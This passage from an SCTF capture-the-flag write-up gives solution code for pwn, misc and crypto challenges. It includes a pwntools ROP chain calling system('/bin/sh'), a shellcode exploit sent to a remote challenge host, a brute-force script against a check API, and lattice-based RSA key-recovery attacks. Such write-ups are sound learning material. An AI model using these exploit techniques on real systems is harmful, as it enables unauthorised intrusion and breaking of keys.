+io.sendline(str(0x40148E))
+io.recvuntil("fa")  #25
+io.sendline(str(rdi))
+io.recvuntil("fa")
+io.sendline(str(binsh))
+io.recvuntil("fa")
+io.sendline(str(system))
+
+for i in range(3):
+    io.recvuntil("fa")
+    io.sendline(str(1))
+
+io.interactive()
+```
+
+### kno_puts
+
+![img](./img02.png)
+
+### vmCode
+
+```python
+#! /usr/bin/python3
+from pwn import *
+#pyright: reportUndefinedVariable=false
+
+context.os = 'linux'
+context.arch = 'amd64'
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf=ELF("./pwn")
+# libc=ELF("./libc.so.6")
+
+debug = 0
+
+if debug:
+    io = process('./pwn')
+    #io = remote('0.0.0.0',9999)
+else:
+    io = remote('1.95.68.23',58924)
+
+def p():
+    gdb.attach(proc.pidof(io)[0])
+
+io.recvuntil("shellcode:")
+
+payload="\x28\x26\x00\x00\x61\x67\x2b\x2b\x26\x2e\x2f\x66\x6c\x23"  #写 ./flag
+payload+="\x31\x2a\x2a\x2a\x28\x23\x2a\x24\x26\x02\x00\x00\x00\x30"  #open
+payload+="\x26\x60\x00\x00\x00\x26\x00\x00\x00\x00\x26\x03\x00\x00\x00\x31\x31\x31\x24\x28\x28\x24\x30"  #read
+payload+="\x28\x26\x60\x00\x00\x00\x31\x26\x01\x00\x00\x00\x26\x01\x00\x00\x00\x30"  #write
+
+# payload+="\x33"
+# p()
+io.sendline(payload)
+
+io.interactive()
+```
+
+## Misc
+
+### Fixit
+
+python 画图
+
+```python
+import re
+import matplotlib.pyplot as plt
+import numpy as np
+
+# Read the CSS content
+with open('style.txt', 'r') as f:
+    css_content = f.read()
+
+# Extract the box-shadow rules from the CSS (matching rgba colors with positions)
+box_shadow_pattern = re.compile(
+    r"rgba\((\d+),(\d+),(\d+),\d+\)\s*(\d+)px\s*(\d+)px")
+box_shadows = box_shadow_pattern.findall(css_content)
+
+# Determine the size of the canvas based on maximum pixel positions
+max_x = max(int(shadow[3]) for shadow in box_shadows)
+max_y = max(int(shadow[4]) for shadow in box_shadows)
+
+# Create a canvas large enough for all pixels (padding added for safety)
+# Initialize with white background (1 = white)
+canvas = np.ones((max_y + 10, max_x + 10))
+
+# Place each pixel on the canvas based on box-shadow values
+for shadow in box_shadows:
+    r, g, b, x, y = map(int, shadow)
+    color = (r + g + b) / 3  # Calculate grayscale by averaging RGB values
+    color = 0 if color < 128 else 1  # Threshold to black and white
+    # Fill the pixel with the correct color (black or white)
+    canvas[y:y+1, x:x+1] = color
+
+# Plot the black and white result using matplotlib
+plt.figure(figsize=(10, 10))
+plt.imshow(canvas, cmap='gray')
+plt.axis('off')  # Hide axes for a clean image
+plt.title("Black and White Version of the Code")
+plt.show()
+```
+
+按照 aztec 码标准修改
+
+![img](./img03.png)
+
+![img](./img04.png)
+
+### 速来探索 SCTF 星球隐藏的秘密！
+
+看到 8000 有 check api，采用 post 去 fuzz
+
+```python
+import requests
+import string
+characters = string.ascii_letters + string.digits
+url = "http://1.95.67.57:8000/check"
+z = "H"
+r = requests.post(url=url, json={"input": z})
+print(r.text)
+while True:
+    for x in characters:
+        y = z+x
+        r = requests.post(url=url, json={"input": y})
+        if r.json()['message'] != 'Really?':
+            z += x
+            break
+    print(z)
+# HAHAHAy04
+```
+
+{"message":"Congratulations, you got the key to the SCTF planet. Let’s start the next journey: <a href=\"http://1.95.67.57:8502\" style=\"color: pink;\">http://1.95.67.57:8502</a>"}
+
+![img](./img05.png)
+
+### 问卷
+
+flag:SCTF{SYC_HAvE_a-G00d_t1me!!}
+
+## Crypto
+
+### Signin
+
+```python
+import random
+from Crypto.Util.number import *
+from gmpy2 import *
+
+#################################
+# Config
+################################
+
+"""
+Setting debug to true will display more informations
+about the lattice, the bounds, the vectors...
+"""
+debug = True
+
+"""
+Setting strict to true will stop the algorithm (and
+return (-1, -1)) if we don't have a correct
+upperbound on the determinant. Note that this
+doesn't necesseraly mean that no solutions
+will be found since the theoretical upperbound is
+usualy far away from actual results. That is why
+you should probably use `strict = False`
+"""
+strict = False
+
+"""
+This is experimental, but has provided remarkable results
+so far. It tries to reduce the lattice as much as it can
+while keeping its efficiency. I see no reason not to use
+this option, but if things don't work, you should try
+disabling it
+"""
+helpful_only = True
+dimension_min = 7  # stop removing if lattice reaches that dimension
+
+
+#################################
+# Functions
+################################
+
+# display stats on helpful vectors
+def helpful_vectors(BB, modulus):
+    nothelpful = 0
+    for ii in range(BB.dimensions()[0]):
+        if BB[ii, ii] >= modulus:
+            nothelpful += 1
+
+    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")
+
+
+# display matrix picture with 0 and X
+def matrix_overview(BB, bound):
+    for ii in range(BB.dimensions()[0]):
+        a = ('%02d ' % ii)
+        for jj in range(BB.dimensions()[1]):
+            a += '0' if BB[ii, jj] == 0 else 'X'
+            if BB.dimensions()[0] < 60:
+                a += ' '
+        if BB[ii, ii] >= bound:
+            a += '~'
+        print(a)
+
+
+# tries to remove unhelpful vectors
+# we start at current = n-1 (last vector)
+def remove_unhelpful(BB, monomials, bound, current):
+    # end of our recursive function
+    if current == -1 or BB.dimensions()[0] <= dimension_min:
+        return BB
+
+    # we start by checking from the end
+    for ii in range(current, -1, -1):
+        # if it is unhelpful:
+        if BB[ii, ii] >= bound:
+            affected_vectors = 0
+            affected_vector_index = 0
+            # let's check if it affects other vectors
+            for jj in range(ii + 1, BB.dimensions()[0]):
+                # if another vector is affected:
+                # we increase the count
+                if BB[jj, ii] != 0:
+                    affected_vectors += 1
+                    affected_vector_index = jj
+
+            # level:0
+            # if no other vectors end up affected
+            # we remove it
+            if affected_vectors == 0:
+                print("* removing unhelpful vector", ii)
+                BB = BB.delete_columns([ii])
+                BB = BB.delete_rows([ii])
+                monomials.pop(ii)
+                BB = remove_unhelpful(BB, monomials, bound, ii - 1)
+                return BB
+
+            # level:1
+            # if just one was affected we check
+            # if it is affecting someone else
+            elif affected_vectors == 1:
+                affected_deeper = True
+                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
+                    # if it is affecting even one vector
+                    # we give up on this one
+                    if BB[kk, affected_vector_index] != 0:
+                        affected_deeper = False
+                # remove both it if no other vector was affected and
+                # this helpful vector is not helpful enough
+                # compared to our unhelpful one
+                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(
+                        bound - BB[ii, ii]):
+                    print("* removing unhelpful vectors",
+                          ii, "and", affected_vector_index)
+                    BB = BB.delete_columns([affected_vector_index, ii])
+                    BB = BB.delete_rows([affected_vector_index, ii])
+                    monomials.pop(affected_vector_index)
+                    monomials.pop(ii)
+                    BB = remove_unhelpful(BB, monomials, bound, ii - 1)
+                    return BB
+    # nothing happened
+    return BB
+
+
+def attack(N, e, m, t, X, Y):
+    modulus = e
+
+    PR.< x, y > = PolynomialRing(ZZ)
+    a = N + 1
+    b = N * N - N + 1
+    f = x * (y * y + a * y + b) + 1
+
+    gg = []
+    for k in range(0, m + 1):
+        for i in range(k, m + 1):
+            for j in range(2 * k, 2 * k + 2):
+                gg.append(x ^ (i - k) * y ^ (j - 2 * k) * f ^ k * e ^ (m - k))
+    for k in range(0, m + 1):
+        for i in range(k, k + 1):
+            for j in range(2 * k + 2, 2 * i + t + 1):
+                gg.append(x ^ (i - k) * y ^ (j - 2 * k) * f ^ k * e ^ (m - k))
+
+    def order_gg(idx, gg, monomials):
+        if idx == len(gg):
+            return gg, monomials
+
+        for i in range(idx, len(gg)):
+            polynomial = gg[i]
+            non = []
+            for monomial in polynomial.monomials():
+                if monomial not in monomials:
+                    non.append(monomial)
+
+            if len(non) == 1:
+                new_gg = gg[:]
+                new_gg[i], new_gg[idx] = new_gg[idx], new_gg[i]
+
+                return order_gg(idx + 1, new_gg, monomials + non)
+
+    gg, monomials = order_gg(0, gg, [])
+
+    # construct lattice B
+    nn = len(monomials)
+    BB = Matrix(ZZ, nn)
+    for ii in range(nn):
+        BB[ii, 0] = gg[ii](0, 0)
+        for jj in range(1, nn):
+            if monomials[jj] in gg[ii].monomials():
+                BB[ii, jj] = gg[ii].monomial_coefficient(
+                    monomials[jj]) * monomials[jj](X, Y)
+
+    # Prototype to reduce the lattice
+    if helpful_only:
+        # automatically remove
+        BB = remove_unhelpful(BB, monomials, modulus ^ m, nn - 1)
+        # reset dimension
+        nn = BB.dimensions()[0]
+        if nn == 0:
+            print("failure")
+            return 0, 0
+
+    # check if vectors are helpful
+    if debug:
+        helpful_vectors(BB, modulus ^ m)
+
+    # check if determinant is correctly bounded
+    det = BB.det()
+    bound = modulus ^ (m * nn)
+    if det >= bound:
+        print("We do not have det < bound. Solutions might not be found.")
+        print("Try with highers m and t.")
+        if debug:
+            diff = (log(det) - log(bound)) / log(2)
+            print("size det(L) - size e^(m*n) = ", floor(diff))
+        if strict:
+            return -1, -1
+    else:
+        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
+
+    # display the lattice basis
+    if debug:
+        matrix_overview(BB, modulus ^ m)
+
+    # LLL
+    if debug:
+        print("optimizing basis of the lattice via LLL, this can take a long time")
+
+    BB = BB.LLL()
+
+    if debug:
+        print("LLL is done!")
+
+    # transform vector i & j -> polynomials 1 & 2
+    if debug:
+        print("looking for independent vectors in the lattice")
+    found_polynomials = False
+
+    for pol1_idx in range(nn - 1):
+        for pol2_idx in range(pol1_idx + 1, nn):
+            # for i and j, create the two polynomials
+            PR.< a, b > = PolynomialRing(ZZ)
+            pol1 = pol2 = 0
+            for jj in range(nn):
+                pol1 += monomials[jj](a, b) * BB[pol1_idx,
+                                                 jj] / monomials[jj](X, Y)
+                pol2 += monomials[jj](a, b) * BB[pol2_idx,
+                                                 jj] / monomials[jj](X, Y)
+
+            # resultant
+            PR.< q > = PolynomialRing(ZZ)
+            rr = pol1.resultant(pol2)
+
+            # are these good polynomials?
+            if rr.is_zero() or rr.monomials() == [1]:
+                continue
+            else:
+                print("found them, using vectors", pol1_idx, "and", pol2_idx)
+                found_polynomials = True
+                break
+        if found_polynomials:
+            break
+
+    if not found_polynomials:
+        print("no independant vectors could be found. This should very rarely happen...")
+        return 0, 0
+
+    rr = rr(q, q)
+
+    # solutions
+    soly = rr.roots()
+
+    if len(soly) == 0:
+        print("Your prediction (delta) is too small")
+        return 0, 0
+
+    soly = soly[0][0]
+    ss = pol1(q, soly)
+    solx = ss.roots()[0][0]
+
+    return solx, soly
+
+
+def inthroot(a, n):
+    return a.nth_root(n, truncate_mode=True)[0]
+
+
+def generate_prime(bit_length):
+    while True:
+        a = random.getrandbits(bit_length // 2)
+        b = random.getrandbits(bit_length // 2)
+
+        if b % 3 == 0:
+            continue
+
+        p = a ** 2 + 3 * b ** 2
+        if p.bit_length() == bit_length and p % 3 == 1 and isPrime(p):
+            return p
+
+
+def point_addition(P, Q, mod):
+    m, n = P
+    p, q = Q
+
+    if p is None:
+        return P
+    if m is None:
+        return Q
+
+    if n is None and q is None:
+        x = m * p % mod
+        y = (m + p) % mod
+        return (x, y)
+
+    if n is None and q is not None:
+        m, n, p, q = p, q, m, n
+
+    if q is None:
+        if (n + p) % mod != 0:
+            x = (m * p + 2) * inverse(n + p, mod) % mod
+            y = (m + n * p) * inverse(n + p, mod) % mod
+            return (x, y)
+        elif (m - n ** 2) % mod != 0:
+            x = (m * p + 2) * inverse(m - n ** 2, mod) % mod
+            return (x, None)
+        else:
+            return (None, None)
+    else:
+        if (m + p + n * q) % mod != 0:
+            x = (m * p + (n + q) * 2) * inverse(m + p + n * q, mod) % mod
+            y = (n * p + m * q + 2) * inverse(m + p + n * q, mod) % mod
+            return (x, y)
+        elif (n * p + m * q + 2) % mod != 0:
+            x = (m * p + (n + q) * 2) * inverse(n * p + m * q + r, mod) % mod
+            return (x, None)
+        else:
+            return (None, None)
+
+
+def special_power(P, a, mod):
+    res = (None, None)
+    t = P
+    while a > 0:
+        if a & 1:
+            res = point_addition(res, t, mod)
+        t = point_addition(t, t, mod)
+        a >>= 1
+    return res
+
+
+def random_padding(message, length):
+    pad = bytes([random.getrandbits(8) for _ in range(length - len(message))])
+    return message + pad
+
+
+N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951
+e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840
+
+X = 1 << 469
+Y = 2 * inthroot(Integer(2 * N), 2)
+
+res = attack(N, e, 4, 2, X, Y)
+
+b, c = res[1], N
+Dsqrt = inthroot(Integer(b ^ 2 - 4 * c), 2)
+p, q = (b + Dsqrt) // 2, (b - Dsqrt) // 2
+assert p * q == N
+print(p, q)
+# 12076532702818803027742169983530419558608401078508017894707093811716696786941308547797368731019670776508448150953432566915232808757060410156378938522359551 504548564498461029558227822137431209369699669992479992757942960885213061136352518231937836400544570835645335056229054429984730840065504477100420427103027
+```
+
+### LinearARTs
+
+chall 是先打 HNP 拿到 MP，old 参考 d3noisy 拿到 N，拿完发现这个 D 怎么直接给了？
+
+后面 lwe
+
+```python
+from Crypto.Util.number import *
+
+M =
+h=
+HP=
+t=len(h)
+
+
+q=M
+# Calculate A & B
+A = []
+B = []
+for ai, bi in zip(HP,h):
+    A.append( ZZ(ai))
+    B.append( ZZ(-bi) )
+
+# Construct Lattice
+Old_level = 625*2*2
+Young_level = 25*5*5*2
+delta_level = Old_level - Young_level
+K = 2^delta_level   # ki < 2^122
+X = q * identity_matrix(QQ, t) # t * t
+Z = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 column
+Z2 = matrix(QQ, [0] * (t+1) + [K]).transpose()    # t+2 column
+
+Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * t
+Y = block_matrix([[Y, Z, Z2]])
+
+# Find short vector
+Y = Y.LLL()
+
+# check
+k0 = ZZ(Y[1, 0] % q)
+x = ZZ(Y[1, -2] / (K/q) % q)
+assert(k0 == (A[0]*x + B[0]) % q)
+print(x)
+XP=77607352971416730198904454710809419728851031375274785698107623002416037367874287011968601667652536706868366893977400515113162997791533914502220488423530889467658400022550003895530063043824847860310840730520278517952570995764964774172161658776978099056807465143388150578581096752897721414690125170421203658645675090296186385196439296883374701184504068934334139970318712931227538434741386769736359324615034891294923297478509053479448434761624362109290066845760279785639847478216057939002530040223352914916529061348536741716839051993227647157508029431497749915552759522331777756427580028294241444575554445192764148621252812219260186763446301362123575766740960062321330215186416951175453464812199138879231406718096102903585775842015648168264880045351332548
+
+bl=Y[1]
+MP=[]
+for i in range(t):
+    MP.append(h[i]+bl[i])
+
+
+D=
+D=matrix(GF(0x10001),D)
+Per=(1,23,2,13,3,16,15,6,22,18,14,4,25,11,20,24,21,9,5,17,7,19,10,12,8)
+P = PermutationGroupElement(Per)
+PM = Matrix(GF(0x10001),P.matrix())
+
+AA=
+b=
+AA=matrix(GF(65537),AA)
+
+A=AA*PM^(-1)*D^(-1)
+b=matrix(GF(65537),b)
+m = block_matrix(ZZ,[[65537,0],[A.T,0],[b,256]])
+e=m.LLL()[25]
+print(e)
+e=
+b=
+q=0x10001
+b=vector(GF(q),b)
+e=vector(GF(q),e)
+B=matrix(GF(q),b-e)
+s = ((A.T).solve_left(B))
+m = 0
+for i in s.list()[::-1]:
+    m *= q
+    m += int(i)
+
+print(long_to_bytes(m))
+```
+
+### 不完全阻塞干扰
+
+分析密钥文件，得到 n、e，ph，qh，直接 copper
+
+```python
+from Crypto.Util.number import *
+import gmpy2
+
+
+e = 0x10001
+
+n = 0x67f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5
+PR.<pl>=PolynomialRing(Zmod(n))
+c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478
+ph = 0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e57019
+qh = 0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a39
+f=((ph*2^504)+pl)^5
+res=f.small_roots(X=2^504,beta=0.4, epsilon=0.02)
+
+print(res)
+
+p=ph*2^504+19801584769756827827951789413634072630967317783014910068949062915896429630245849656484814594288070808979163799004925954951699233550170640022441231211125
+print(isPrime(p))
+q2=n//(p^5)
+q=gmpy2.iroot(q2,2)[0]
+phi=p^4*(p-1)*q*(q-1)
+d=inverse(65537,phi)
+print(long_to_bytes(pow(c,d,n)))
+```
+
+### Whisper
+
+Dual rsa
+
+板子打完 d 正常解密
+
+```python
+from sage.all import *
+import math
+import itertools
+from Crypto.Util.number import *
+c = b'\x15\xaa\xdfCO\x05\xfcG\xe0oi\x97\xa5T\xc1\xde|\xec\xda\xd1\xfa\xf4\nt\xbc|m|L_\xa53\xfe,`[\xcd\xe6\xac\xaa\x0e\xe3Wo`{\xe6P81\xb3=T\x92\x8e\xaa\xd1\xf8\xd6A\x87\xcf\xf8\xf4\xf1\xa6\x7f\xf6\xd8Fq[\xfcG\x95\xb2.!n\xc7\xec\x92\x10m\xb6\xa1\xfd\xeb\x9dd\x99h\xa8\x1c\xbb\x10\xa3\xe5\xc8(\x16z\xf2\xfd\x0e\x81SO\x11\x19\x8bc\xca\xad\x0e\xd8\xe9\xf8D\xdb\x84\x03\x02{\xa3\xeb\x1aV'
+n2 = 0x071c324e8769493187c15f72d5cc695729b48488ee3fbd01db00d5c478f08c7cf32093ba61745051d3e9d169523aa91438181f47679aff5edd22950f74a1eb1443320aaa5d97f5c1e81b5ef9a3e69ba669abc4c6c4b405f5088a603a74f9bcef88823b4523574114c810600838728196f8e5e0d4aeeeeab79dd8683a72f3c017
+n1 = 0x1b5d4fe0aa6782e275d4ce12a6d57562efbbe7db6f5277255b891729bfa2a18d3edb49843d7989a37b9516be2df8ca939058e65f64b5fb2071bea4f5f8d1392895b32bf0377d99f4f79979125e5db01cdb5080a1c2d665c9ac31b5823025499c9513277bae5e7a846cd271c4396e2ba219020e58a9055cb18a28d36a00bf717b
+c = bytes_to_long(c)
+e = 0x79f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe672447743bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89cdce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
+alice_public_key = bob_public_key = [n1, n2]
+# display matrix picture with 0 and X
+# references: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage
+
+def matrix_overview(BB):
+    for ii in range(BB.dimensions()[0]):
+        a = ('%02d ' % ii)
+        for jj in range(BB.dimensions()[1]):
+            a += ' ' if BB[ii, jj] == 0 else 'X'
+            if BB.dimensions()[0] < 60:
+                a += ' '
+        print(a)
+
+def dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt):
+    '''
+    Attack to Dual RSA: Liqiang et al.'s attack implementation
+
+    References:
+        [1] Liqiang Peng, Lei Hu, Yao Lu, Jun Xu and Zhangjie Huang. 2016. "Cryptanalysis of Dual RSA"
+    '''
+    N = (n1 + n2) // 2
+    A = ZZ(floor(N ^ 0.5))
+
+    _XX = ZZ(floor(N ^ delta))
+    _YY = ZZ(floor(N ^ 0.5))
+    _ZZ = ZZ(floor(N ^ (delta - 1./4)))
+    _UU = _XX * _YY + 1
+
+    # Find a "good" basis satisfying d = a1 * l'11 + a2 * l'21
+    M = Matrix(ZZ, [[A, e], [0, n1]])
+    B = M.LLL()
+    l11, l12 = B[0]
+    l21, l22 = B[1]
+    l_11 = ZZ(l11 // A)
+    l_21 = ZZ(l21 // A)
+
+    modulo = e * l_21
+    F = Zmod(modulo)
+
+    PR = PolynomialRing(F, 'u, x, y, z')
+    u, x, y, z = PR.gens()
+
+    PK = PolynomialRing(ZZ, 'uk, xk, yk, zk')
+    uk, xk, yk, zk = PK.gens()
+
+    # For transform xy to u-1 (unravelled linearlization)
+    PQ = PK.quo(xk * yk + 1 - uk)
+
+    f = PK(x * (n2 + y) - e * l_11 * z + 1)
+
+    fbar = PQ(f).lift()
+
+    # Polynomial construction
+    gijk = {}
+    for k in range(0, mm + 1):
+        for i in range(0, mm - k + 1):
+            for j in range(0, mm - k - i + 1):
+                gijk[i, j, k] = PQ(xk ^ i * zk ^ j * PK(fbar)
+                                   ^ k * modulo ^ (mm-k)).lift()
+
+    hjkl = {}
+    for j in range(1, tt + 1):
+        for k in range(floor(mm / tt) * j, mm + 1):
+            for l in range(0, k + 1):
+                hjkl[j, k, l] = PQ(yk ^ j * zk ^ (k-l) *
+                                   PK(fbar) ^ l * modulo ^ (mm-l)).lift()
+
+    monomials = []
+    for k in gijk.keys():
+        monomials += gijk[k].monomials()
+    for k in hjkl.keys():
+        monomials += hjkl[k].monomials()
+
+    monomials = sorted(set(monomials))[::-1]
+    assert len(monomials) == len(gijk) + len(hjkl)  # square matrix?
+    dim = len(monomials)
+
+    # Create lattice from polynmial g_{ijk} and h_{jkl}
+    M = Matrix(ZZ, dim)
+    row = 0
+    for k in gijk.keys():
+        for i, monomial in enumerate(monomials):
+            M[row, i] = gijk[k].monomial_coefficient(
+                monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
+        row += 1
+    for k in hjkl.keys():
+        for i, monomial in enumerate(monomials):
+            M[row, i] = hjkl[k].monomial_coefficient(
+                monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
+        row += 1
+
+    matrix_overview(M)
+    print('=' * 128)
+
+    # LLL
+    B = M.LLL()
+
+    matrix_overview(B)
+
+    # Construct polynomials from reduced lattices
+    H = {i: 0 for i in range(dim)}
+    for j in range(dim):
+        for i in range(dim):
+            H[i] += PK((monomials[j] * B[i, j]) /
+                       monomials[j].subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ))
+    H = list(H.values())
+
+    PQ = PolynomialRing(QQ, 'uq, xq, yq, zq')
+    uq, xq, yq, zq = PQ.gens()
+
+    # Inversion of unravelled linearlization
+    for i in range(dim):
+        H[i] = PQ(H[i].subs(uk=xk * yk + 1))
+
+    # Calculate Groebner basis for solve system of equations
+    I = Ideal(*H[1:20])
+    g = I.groebner_basis('giac')[::-1]
+    mon = list(map(lambda t: t.monomials(), g))
+
+    PX = PolynomialRing(ZZ, 'xs')
+    xs = PX.gen()
+
+    x_pol = y_pol = z_pol = None
+
+    for i in range(len(g)):
+        if mon[i] == [xq, 1]:
+            print(g[i] / g[i].lc())
+            x_pol = g[i] / g[i].lc()
+        elif mon[i] == [yq, 1]:
+            print(g[i] / g[i].lc())
+            y_pol = g[i] / g[i].lc()
+        elif mon[i] == [zq, 1]:
+            print(g[i] / g[i].lc())
+            z_pol = g[i] / g[i].lc()
+
+    if x_pol is None or y_pol is None or z_pol is None:
+        print('[-] Failed: we cannot get a solution...')
+        return
+
+    x0 = x_pol.subs(xq=xs).roots()[0][0]
+    y0 = y_pol.subs(yq=xs).roots()[0][0]
+    z0 = z_pol.subs(zq=xs).roots()[0][0]
+
+    # solution check
+    assert f(x0 * y0 + 1, x0, y0, z0) % modulo == 0
+
+    a0 = z0
+    a1 = (x0 * (n2 + y0) + 1 - e * l_11 * z0) / (e * l_21)
+
+    d = a0 * l_11 + a1 * l_21
+    return d
+
+if __name__ == '__main__':
+    delta = 0.334
+    mm = 4
+    tt = 2
+
+    n1 = alice_public_key[0]
+    n2 = alice_public_key[1]
+    e = e
+
+    d1 = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt)
+    print('[+] d for alice = %d' % d1)
+
+    n1 = bob_public_key[0]
+    n2 = bob_public_key[1]
+    e = e
+
+    d2 = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt)
+    print('[+] d for bob = %d' % d2)
+```
